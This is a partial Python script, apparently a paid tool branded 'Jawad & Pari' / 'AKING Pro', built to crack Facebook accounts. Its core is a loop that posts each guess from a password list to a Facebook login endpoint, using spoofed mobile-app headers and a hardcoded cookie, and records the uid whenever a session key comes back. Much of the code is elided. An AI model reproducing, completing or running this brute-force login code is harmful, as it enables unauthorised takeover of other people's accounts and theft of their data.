...
----------------------------------------------
 ...
 Github    : PARI
 Facebook  : FRIEND
 Tool Name : Jawad & Pari
 Type type : PAID
 Version   : 2.0
----------------------------------------------
 AKING Pro version 1.9.8
 For Haters: Tumhare Okat Nhi Meri Brabri Krne ki 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                data = {'adid':adid,
                                        ...
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {'authority': 'www.facebook.com',
                                        'method': 'POST',
                                        'path': '/ajax/webstorage/process_keys/?state=1',
                                        'scheme': 'https',
                                        'accept': '*/*',
                                        ...
                                        'content-length': '627',
                                        'content-type': 'application/x-www-form-urlencoded',
                                        'cookie': 'sb=nKBSYqRECxyL7RuJr8vc0xu1; datr=nKBSYvrx9hfYlie57qaPOHCi; locale=en_US; wd=686x732; dpr=0.8333333730697632; fr=0hLscfSFT8A5vSA7Q.AWVPcEZ8KM5n5Ip4mb2lNv_KR8E.Bjtru5.df.AAA.0.0.BjuOKI.AWV4HuhBS00',
                                        ...
                                        'x-fb-lsd': 'AVqFb0wFtnU',}
                                       
                                po = requests.post(f'https://www.facebook.com/ajax/webstorage/process_keys/?state=1',data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
